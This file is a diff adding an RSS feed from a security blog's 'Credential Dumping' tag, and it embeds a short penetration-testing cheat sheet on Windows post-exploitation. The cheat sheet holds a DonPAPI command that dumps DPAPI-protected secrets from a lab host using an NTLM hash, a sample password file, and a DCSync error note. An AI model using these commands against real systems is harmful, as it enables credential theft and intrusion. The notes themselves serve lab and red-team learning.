@@ -1,0 +1,55 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fyx(me) – Credential Dumping</title><link>https://fyx.me/tags/credential-dumping/</link><description>Recent content in Credential Dumping on fyx(me)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://fyx.me/tags/credential-dumping/index.xml" rel="self" type="application/rss+xml"/><item><title>Post Exploitation &amp; Looting</title><link>https://fyx.me/bazaar/windows/post-exploitation--looting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/post-exploitation--looting/</guid><description>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-orange-100 hx-bg-orange-50 hx-text-orange-800 dark:hx-border-orange-400/30 dark:hx-bg-orange-400/20 dark:hx-text-orange-300">
+&lt;p class="hx-flex hx-items-center hx-font-medium">Tbd&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>Looting secrets with &lt;a href="https://github.com/login-securite/DonPAPI?tab=readme-ov-file#collection" target="_blank" rel="noopener">DonPAPI&lt;/a>&lt;span class="hx-absolute -hx-mt-20" id="looting-secrets-with-donpapihttpsgithubcomlogin-securitedonpapitabreadme-ov-filecollection">&lt;/span>
+&lt;a href="#looting-secrets-with-donpapihttpsgithubcomlogin-securitedonpapitabreadme-ov-filecollection" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-indigo-200 hx-bg-indigo-100 hx-text-indigo-900 dark:hx-border-indigo-200/30 dark:hx-bg-indigo-900/30 dark:hx-text-indigo-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Important&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>&lt;ul>
+&lt;li>You need to provide a password file containing username and password so DonPAPI can decrypt the encrypted files using masterkeys and what not.&lt;/li>
+&lt;li>Folders/Files under &lt;code>C:\Users\&amp;lt;user&amp;gt;\AppData\Local\Microsoft\Credentials&lt;/code> are hidden. You need to use &lt;code>dir /f&lt;/code> or &lt;code>Get-ChildItem -force&lt;/code> to see them.&lt;/li>
+&lt;/ul>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">donpapi collect -t target.lab.local -u adminuser -H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3 -d lab.local --pwdfile ./creds.txt&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>Example &lt;code>pwdfile&lt;/code>:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div class="filename" dir="auto">creds.txt&lt;/div>&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">jane.doe:World123!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">octave:RubberTrain99
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john.elton:Ilovemusic1723&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;blockquote>
+&lt;p>Ref: &lt;a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h3>DCSync&lt;span class="hx-absolute -hx-mt-20" id="dcsync">&lt;/span>
+&lt;a href="#dcsync" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;h4>Errors&lt;span class="hx-absolute -hx-mt-20" id="errors">&lt;/span>
+&lt;a href="#errors" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;blockquote>
+&lt;p>The distinguished name specified for this replication operation is invalid.&lt;/p>
+&lt;/blockquote>
+&lt;p>You don&amp;rsquo;t have perms.&lt;/p>
+&lt;blockquote>
+&lt;p>Ref: &lt;a href="https://blog.spookysec.net/domain-controller-sync/" target="_blank" rel="noopener">https://blog.spookysec.net/domain-controller-sync/&lt;/a>&lt;/p>
+&lt;/blockquote></description></item></channel></rss>
